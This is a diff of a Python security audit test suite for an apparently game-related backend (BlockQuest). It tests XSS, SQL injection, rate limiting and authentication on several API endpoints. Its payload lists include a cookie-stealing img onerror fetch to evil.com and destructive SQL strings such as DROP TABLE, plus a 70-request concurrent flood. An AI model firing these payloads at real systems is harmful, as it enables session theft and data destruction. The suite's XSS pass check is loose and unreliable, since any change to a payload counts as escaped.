@@ -41,25 +41,691 @@ class SecurityAuditTester:
             "functional": []
         }
     
-    def log_result(self, test_name: str, success: bool, details: str = "", severity: str = "normal"):
-        """Log test result with severity tracking"""
-        self.results["total_tests"] += 1
-        if success:
-            self.results["passed"] += 1
-            print(f"✅ {test_name}: PASS")
-        else:
-            self.results["failed"] += 1
-            print(f"❌ {test_name}: FAIL - {details}")
-            
-            if severity == "critical":
-                self.results["critical_failures"].append(f"{test_name}: {details}")
-            elif severity == "security":
-                self.results["security_issues"].append(f"{test_name}: {details}")
-            elif severity == "edge_case":
-                self.results["edge_case_failures"].append(f"{test_name}: {details}")
+    def log_security_result(self, category: str, test_name: str, passed: bool, details: str):
+        """Log security audit result"""
+        result = {
+            "test": test_name,
+            "passed": passed,
+            "details": details,
+            "timestamp": time.time()
+        }
+        self.security_audit[category].append(result)
+        status = "✅ PASS" if passed else "❌ FAIL"
+        print(f"{status}: {test_name} - {details}")
+
+    def test_comprehensive_xss_prevention(self):
+        """Comprehensive XSS prevention testing as per security audit requirements"""
+        print("\n🔒 COMPREHENSIVE XSS PREVENTION TESTING")
+        print("=" * 50)
         
-        if details:
-            print(f"   Details: {details}")
+        xss_payloads = [
+            "<script>alert('xss')</script>",
+            "<img onerror=alert('xss') src=x>",
+            "<svg onload=alert('xss')>",
+            "javascript:alert('xss')",
+            "<iframe src=javascript:alert('xss')>",
+            "<body onload=alert('xss')>",
+            "<input onfocus=alert('xss') autofocus>",
+            "';alert('xss');//",
+            "<script>document.cookie='stolen'</script>",
+            "<img src=x onerror=fetch('http://evil.com/'+document.cookie)>"
+        ]
+        
+        # Test POST /api/players endpoint
+        print("\nTesting XSS on POST /api/players...")
+        for i, payload in enumerate(xss_payloads):
+            try:
+                response = self.session.post(
+                    f"{self.api_url}/players",
+                    json={"username": payload},
+                    timeout=10
+                )
+                
+                if response.status_code == 200:
+                    player_data = response.json()
+                    returned_username = player_data.get("username", "")
+                    
+                    # Check if XSS payload is properly escaped
+                    is_escaped = (
+                        "&lt;" in returned_username or 
+                        "&gt;" in returned_username or
+                        payload != returned_username or
+                        len(returned_username) < len(payload)  # Sanitized/truncated
+                    )
+                    
+                    self.log_security_result(
+                        "xss_prevention", 
+                        f"Players XSS Test {i+1}",
+                        is_escaped,
+                        f"Payload: {payload[:30]}... → Result: {returned_username[:30]}..."
+                    )
+                else:
+                    self.log_security_result(
+                        "xss_prevention",
+                        f"Players XSS Test {i+1}",
+                        True,
+                        f"Request properly rejected with status {response.status_code}"
+                    )
+                    
+            except Exception as e:
+                self.log_security_result(
+                    "xss_prevention",
+                    f"Players XSS Test {i+1}",
+                    False,
+                    f"Error: {str(e)}"
+                )
+        
+        # Test POST /api/leaderboard endpoint
+        print("\nTesting XSS on POST /api/leaderboard...")
+        for i, payload in enumerate(xss_payloads):
+            try:
+                response = self.session.post(
+                    f"{self.api_url}/leaderboard",
+                    json={
+                        "player_id": str(uuid.uuid4()),
+                        "player_name": payload,
+                        "game_id": "test-game",
+                        "score": 100
+                    },
+                    timeout=10
+                )
+                
+                if response.status_code == 200:
+                    entry_data = response.json()
+                    returned_name = entry_data.get("player_name", "")
+                    
+                    is_escaped = (
+                        "&lt;" in returned_name or 
+                        "&gt;" in returned_name or
+                        payload != returned_name or
+                        len(returned_name) < len(payload)
+                    )
+                    
+                    self.log_security_result(
+                        "xss_prevention",
+                        f"Leaderboard XSS Test {i+1}",
+                        is_escaped,
+                        f"Payload: {payload[:30]}... → Result: {returned_name[:30]}..."
+                    )
+                else:
+                    self.log_security_result(
+                        "xss_prevention",
+                        f"Leaderboard XSS Test {i+1}",
+                        True,
+                        f"Request properly rejected with status {response.status_code}"
+                    )
+                    
+            except Exception as e:
+                self.log_security_result(
+                    "xss_prevention",
+                    f"Leaderboard XSS Test {i+1}",
+                    False,
+                    f"Error: {str(e)}"
+                )
+
+        # Test POST /api/auth/register endpoint
+        print("\nTesting XSS on POST /api/auth/register...")
+        for i, payload in enumerate(xss_payloads):
+            try:
+                response = self.session.post(
+                    f"{self.api_url}/auth/register",
+                    json={
+                        "email": f"test{i}{int(time.time())}@example.com",
+                        "password": "testpass123",
+                        "username": payload
+                    },
+                    timeout=10
+                )
+                
+                if response.status_code == 200:
+                    user_data = response.json()
+                    returned_username = user_data.get("user", {}).get("username", "")
+                    
+                    is_escaped = (
+                        "&lt;" in returned_username or 
+                        "&gt;" in returned_username or
+                        payload != returned_username or
+                        len(returned_username) < len(payload)
+                    )
+                    
+                    self.log_security_result(
+                        "xss_prevention",
+                        f"Register XSS Test {i+1}",
+                        is_escaped,
+                        f"Payload: {payload[:30]}... → Result: {returned_username[:30]}..."
+                    )
+                else:
+                    self.log_security_result(
+                        "xss_prevention",
+                        f"Register XSS Test {i+1}",
+                        True,
+                        f"Request properly rejected with status {response.status_code}"
+                    )
+                    
+            except Exception as e:
+                self.log_security_result(
+                    "xss_prevention",
+                    f"Register XSS Test {i+1}",
+                    False,
+                    f"Error: {str(e)}"
+                )
+
+        # Test POST /api/badges endpoint
+        print("\nTesting XSS on POST /api/badges...")
+        for i, payload in enumerate(xss_payloads):
+            try:
+                response = self.session.post(
+                    f"{self.api_url}/badges",
+                    json={
+                        "player_id": str(uuid.uuid4()),
+                        "name": payload,
+                        "description": "Test badge",
+                        "rarity": "Common",
+                        "game_id": "test-game",
+                        "icon": "🏆"
+                    },
+                    timeout=10
+                )
+                
+                if response.status_code == 200:
+                    badge_data = response.json()
+                    returned_name = badge_data.get("name", "")
+                    
+                    is_escaped = (
+                        "&lt;" in returned_name or 
+                        "&gt;" in returned_name or
+                        payload != returned_name or
+                        len(returned_name) < len(payload)
+                    )
+                    
+                    self.log_security_result(
+                        "xss_prevention",
+                        f"Badge XSS Test {i+1}",
+                        is_escaped,
+                        f"Payload: {payload[:30]}... → Result: {returned_name[:30]}..."
+                    )
+                else:
+                    self.log_security_result(
+                        "xss_prevention",
+                        f"Badge XSS Test {i+1}",
+                        True,
+                        f"Request properly rejected with status {response.status_code}"
+                    )
+                    
+            except Exception as e:
+                self.log_security_result(
+                    "xss_prevention",
+                    f"Badge XSS Test {i+1}",
+                    False,
+                    f"Error: {str(e)}"
+                )
+
+    def test_comprehensive_sql_injection(self):
+        """Comprehensive SQL injection testing"""
+        print("\n🛡️ COMPREHENSIVE SQL INJECTION TESTING")
+        print("=" * 50)
+        
+        sql_payloads = [
+            "admin'--",
+            "'; DROP TABLE users;--",
+            "' OR '1'='1",
+            "admin'; DELETE FROM users WHERE '1'='1",
+            "' UNION SELECT * FROM users--",
+            "'; INSERT INTO users VALUES('hacker','pass');--",
+            "' OR 1=1--",
+            "admin'/*",
+            "' AND 1=0 UNION SELECT NULL, username, password FROM users--"
+        ]
+        
+        print("\nTesting SQL Injection on POST /api/auth/register...")
+        for i, payload in enumerate(sql_payloads):
+            try:
+                response = self.session.post(
+                    f"{self.api_url}/auth/register",
+                    json={
+                        "email": f"test{i}{int(time.time())}@example.com",
+                        "password": "testpass123",
+                        "username": payload
+                    },
+                    timeout=10
+                )
+                
+                if response.status_code == 200:
+                    user_data = response.json()
+                    returned_username = user_data.get("user", {}).get("username", "")
+                    
+                    # Check if SQL injection characters are properly removed/escaped
+                    has_sql_chars = any(char in returned_username for char in ["'", '"', ";", "\\", "--"])
+                    
+                    self.log_security_result(
+                        "sql_injection",
+                        f"SQL Injection Test {i+1}",
+                        not has_sql_chars,
+                        f"Payload: {payload} → Result: {returned_username}"
+                    )
+                else:
+                    self.log_security_result(
+                        "sql_injection",
+                        f"SQL Injection Test {i+1}",
+                        True,
+                        f"Request properly rejected with status {response.status_code}"
+                    )
+                    
+            except Exception as e:
+                self.log_security_result(
+                    "sql_injection",
+                    f"SQL Injection Test {i+1}",
+                    False,
+                    f"Error: {str(e)}"
+                )
+
+    def test_comprehensive_rate_limiting(self):
+        """Comprehensive rate limiting testing"""
+        print("\n⏱️ COMPREHENSIVE RATE LIMITING TESTING")
+        print("=" * 50)
+        
+        endpoints_to_test = [
+            ("/auth/login", {
+                "email": "nonexistent@example.com",
+                "password": "wrongpassword"
+            }),
+            ("/auth/register", {
+                "email": "test@example.com",
+                "password": "testpass123",
+                "username": "testuser"
+            }),
+            ("/leaderboard", {
+                "player_id": str(uuid.uuid4()),
+                "player_name": "TestPlayer",
+                "game_id": "test-game",
+                "score": 100
+            }),
+            ("/players", {
+                "username": "testplayer"
+            })
+        ]
+        
+        for endpoint, base_payload in endpoints_to_test:
+            print(f"\nTesting rate limiting on {endpoint}...")
+            
+            def make_request(request_id):
+                try:
+                    # Create unique payload for each request
+                    payload = base_payload.copy()
+                    if "email" in payload:
+                        payload["email"] = f"test{request_id}{uuid.uuid4().hex[:6]}@example.com"
+                    if "username" in payload:
+                        payload["username"] = f"user{request_id}{uuid.uuid4().hex[:6]}"
+                    
+                    response = requests.post(
+                        f"{self.api_url}{endpoint}",
+                        json=payload,
+                        timeout=5
+                    )
+                    return response.status_code
+                except:
+                    return 500
+            
+            # Send 70 rapid concurrent requests
+            rate_limited = False
+            success_count = 0
+            status_429_count = 0
+            
+            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+                futures = [executor.submit(make_request, i) for i in range(70)]
+                
+                for future in concurrent.futures.as_completed(futures):
+                    status_code = future.result()
+                    if status_code == 429:
+                        rate_limited = True
+                        status_429_count += 1
+                    elif status_code in [200, 201]:
+                        success_count += 1
+            
+            self.log_security_result(
+                "rate_limiting",
+                f"Rate Limiting - {endpoint}",
+                rate_limited,
+                f"429 responses: {status_429_count}/70, Success: {success_count}/70, Rate limited: {rate_limited}"
+            )
+
+    def test_comprehensive_authentication(self):
+        """Comprehensive authentication testing"""
+        print("\n🔐 COMPREHENSIVE AUTHENTICATION TESTING")
+        print("=" * 50)
+        
+        # Test user registration and login flow
+        test_email = f"authtest{int(time.time())}@example.com"
+        test_password = "SecurePass123!"
+        test_username = f"authtest{int(time.time())}"
+        
+        print("\nTesting user registration...")
+        try:
+            register_response = self.session.post(
+                f"{self.api_url}/auth/register",
+                json={
+                    "email": test_email,
+                    "password": test_password,
+                    "username": test_username
+                },
+                timeout=10
+            )
+            
+            registration_success = register_response.status_code == 200
+            if registration_success:
+                register_data = register_response.json()
+                self.auth_token = register_data.get("access_token")
+            
+            self.log_security_result(
+                "authentication",
+                "User Registration",
+                registration_success,
+                f"Status: {register_response.status_code}"
+            )
+            
+        except Exception as e:
+            self.log_security_result(
+                "authentication",
+                "User Registration",
+                False,
+                f"Error: {str(e)}"
+            )
+        
+        print("\nTesting user login...")
+        try:
+            login_response = self.session.post(
+                f"{self.api_url}/auth/login",
+                json={
+                    "email": test_email,
+                    "password": test_password
+                },
+                timeout=10
+            )
+            
+            login_success = login_response.status_code == 200
+            if login_success:
+                login_data = login_response.json()
+                self.auth_token = login_data.get("access_token")
+            
+            self.log_security_result(
+                "authentication",
+                "User Login",
+                login_success,
+                f"Status: {login_response.status_code}"
+            )
+            
+        except Exception as e:
+            self.log_security_result(
+                "authentication",
+                "User Login",
+                False,
+                f"Error: {str(e)}"
+            )
+        
+        print("\nTesting /auth/me without token (should return 401)...")
+        try:
+            me_response_no_token = self.session.get(
+                f"{self.api_url}/auth/me",
+                timeout=10
+            )
+            
+            unauthorized_correctly = me_response_no_token.status_code == 401
+            self.log_security_result(
+                "authentication",
+                "Auth Protection - No Token",
+                unauthorized_correctly,
+                f"Status: {me_response_no_token.status_code} (expected 401)"
+            )
+        except Exception as e:
+            self.log_security_result(
+                "authentication",
+                "Auth Protection - No Token",
+                False,
+                f"Error: {str(e)}"
+            )
+        
+        print("\nTesting /auth/me with valid token...")
+        if self.auth_token:
+            try:
+                me_response_with_token = self.session.get(
+                    f"{self.api_url}/auth/me",
+                    headers={"Authorization": f"Bearer {self.auth_token}"},
+                    timeout=10
+                )
+                
+                auth_success = me_response_with_token.status_code == 200
+                self.log_security_result(
+                    "authentication",
+                    "Auth Protection - Valid Token",
+                    auth_success,
+                    f"Status: {me_response_with_token.status_code}"
+                )
+            except Exception as e:
+                self.log_security_result(
+                    "authentication",
+                    "Auth Protection - Valid Token",
+                    False,
+                    f"Error: {str(e)}"
+                )
+        
+        print("\nTesting /auth/sync without token (should return 401)...")
+        try:
+            sync_response_no_token = self.session.put(
+                f"{self.api_url}/auth/sync",
+                json={"high_scores": {"test-game": 100}},
+                timeout=10
+            )
+            
+            sync_protected = sync_response_no_token.status_code == 401
+            self.log_security_result(
+                "authentication",
+                "Sync Endpoint Protection",
+                sync_protected,
+                f"Status: {sync_response_no_token.status_code} (expected 401)"
+            )
+        except Exception as e:
+            self.log_security_result(
+                "authentication",
+                "Sync Endpoint Protection",
+                False,
+                f"Error: {str(e)}"
+            )
+
+    def test_comprehensive_functional(self):
+        """Test that all endpoints work correctly after security patches"""
+        print("\n⚙️ COMPREHENSIVE FUNCTIONAL TESTING")
+        print("=" * 50)
+        
+        # Test health check
+        print("\nTesting GET /api/health...")
+        try:
+            health_response = self.session.get(f"{self.api_url}/health", timeout=10)
+            health_ok = health_response.status_code == 200
+            self.log_security_result(
+                "functional",
+                "Health Check",
+                health_ok,
+                f"Status: {health_response.status_code}"
+            )
+        except Exception as e:
+            self.log_security_result(
+                "functional",
+                "Health Check",
+                False,
+                f"Error: {str(e)}"
+            )
+        
+        # Test player creation with valid data
+        print("\nTesting POST /api/players with valid data...")
+        try:
+            valid_username = f"validuser{int(time.time())}"
+            player_response = self.session.post(
+                f"{self.api_url}/players",
+                json={"username": valid_username},
+                timeout=10
+            )
+            
+            player_created = player_response.status_code == 200
+            if player_created:
+                player_data = player_response.json()
+                self.test_player_id = player_data.get("id")
+            
+            self.log_security_result(
+                "functional",
+                "Player Creation - Valid Data",
+                player_created,
+                f"Status: {player_response.status_code}"
+            )
+            
+        except Exception as e:
+            self.log_security_result(
+                "functional",
+                "Player Creation - Valid Data",
+                False,
+                f"Error: {str(e)}"
+            )
+        
+        # Test leaderboard submission
+        print("\nTesting POST /api/leaderboard...")
+        try:
+            leaderboard_response = self.session.post(
+                f"{self.api_url}/leaderboard",
+                json={
+                    "player_id": str(uuid.uuid4()),
+                    "player_name": "FunctionalTestPlayer",
+                    "game_id": "functional-test",
+                    "score": 1000
+                },
+                timeout=10
+            )
+            
+            leaderboard_ok = leaderboard_response.status_code == 200
+            self.log_security_result(
+                "functional",
+                "Leaderboard Submission",
+                leaderboard_ok,
+                f"Status: {leaderboard_response.status_code}"
+            )
+            
+        except Exception as e:
+            self.log_security_result(
+                "functional",
+                "Leaderboard Submission",
+                False,
+                f"Error: {str(e)}"
+            )
+        
+        # Test leaderboard retrieval
+        print("\nTesting GET /api/leaderboard...")
+        try:
+            get_leaderboard_response = self.session.get(
+                f"{self.api_url}/leaderboard",
+                timeout=10
+            )
+            
+            leaderboard_get_ok = get_leaderboard_response.status_code == 200
+            self.log_security_result(
+                "functional",
+                "Leaderboard Retrieval",
+                leaderboard_get_ok,
+                f"Status: {get_leaderboard_response.status_code}"
+            )
+        except Exception as e:
+            self.log_security_result(
+                "functional",
+                "Leaderboard Retrieval",
+                False,
+                f"Error: {str(e)}"
+            )
+
+    def run_security_audit(self):
+        """Run comprehensive security audit as requested"""
+        print("🚨 BACKEND SECURITY AUDIT - BLOCKQUEST OFFICIAL")
+        print(f"Target: {self.api_url}")
+        print("=" * 60)
+        
+        # Run security audit tests in order
+        self.test_comprehensive_functional()
+        self.test_comprehensive_xss_prevention()
+        self.test_comprehensive_sql_injection()
+        self.test_comprehensive_authentication()
+        self.test_comprehensive_rate_limiting()
+        
+        # Generate security audit summary
+        self.generate_security_audit_summary()
+
+    def generate_security_audit_summary(self):
+        """Generate comprehensive security audit summary"""
+        print("\n" + "=" * 60)
+        print("🔍 SECURITY AUDIT SUMMARY REPORT")
+        print("=" * 60)
+        
+        total_tests = 0
+        total_passed = 0
+        
+        for category, tests in self.security_audit.items():
+            category_passed = sum(1 for test in tests if test["passed"])
+            category_total = len(tests)
+            total_tests += category_total
+            total_passed += category_passed
+            
+            print(f"\n📊 {category.upper().replace('_', ' ')}:")
+            print(f"   Passed: {category_passed}/{category_total}")
+            
+            # Show failed tests
+            failed_tests = [test for test in tests if not test["passed"]]
+            if failed_tests:
+                print("   ❌ Failed Tests:")
+                for test in failed_tests:
+                    print(f"      - {test['test']}: {test['details']}")
+        
+        security_score = (total_passed/total_tests*100) if total_tests > 0 else 0
+        print(f"\n🎯 OVERALL SECURITY SCORE: {total_passed}/{total_tests} ({security_score:.1f}%)")
+        
+        # Security status determination
+        if security_score >= 90:
+            print("✅ EXCELLENT SECURITY: All critical security measures are working properly")
+        elif security_score >= 70:
+            print("⚠️ GOOD SECURITY: Most security measures working, minor issues detected")
+        elif security_score >= 50:
+            print("🔶 MODERATE SECURITY: Several security issues need attention")
+        else:
+            print("🚨 CRITICAL SECURITY ISSUES: Immediate security fixes required")
+        
+        # Detailed recommendations
+        print("\n📋 SECURITY AUDIT FINDINGS:")
+        
+        xss_failed = sum(1 for test in self.security_audit["xss_prevention"] if not test["passed"])
+        if xss_failed > 0:
+            print(f"   🔴 XSS Vulnerabilities: {xss_failed} endpoints vulnerable to XSS attacks")
+        else:
+            print("   ✅ XSS Prevention: All endpoints properly sanitize user input")
+        
+        sql_failed = sum(1 for test in self.security_audit["sql_injection"] if not test["passed"])
+        if sql_failed > 0:
+            print(f"   🔴 SQL Injection Vulnerabilities: {sql_failed} endpoints vulnerable")
+        else:
+            print("   ✅ SQL Injection Prevention: All endpoints properly sanitize SQL input")
+        
+        rate_failed = sum(1 for test in self.security_audit["rate_limiting"] if not test["passed"])
+        if rate_failed > 0:
+            print(f"   🔴 Rate Limiting Issues: {rate_failed} endpoints lack proper rate limiting")
+        else:
+            print("   ✅ Rate Limiting: All critical endpoints have rate limiting implemented")
+        
+        auth_failed = sum(1 for test in self.security_audit["authentication"] if not test["passed"])
+        if auth_failed > 0:
+            print(f"   🔴 Authentication Issues: {auth_failed} authentication problems detected")
+        else:
+            print("   ✅ Authentication: JWT authentication working correctly")
+        
+        func_failed = sum(1 for test in self.security_audit["functional"] if not test["passed"])
+        if func_failed > 0:
+            print(f"   🔴 Functional Issues: {func_failed} endpoints not working correctly")
+        else:
+            print("   ✅ Functional Testing: All endpoints working correctly after security patches")
+        
+        return total_passed, total_tests
     
     def make_request(self, method: str, endpoint: str, **kwargs) -> requests.Response:
         """Make HTTP request with proper headers"""
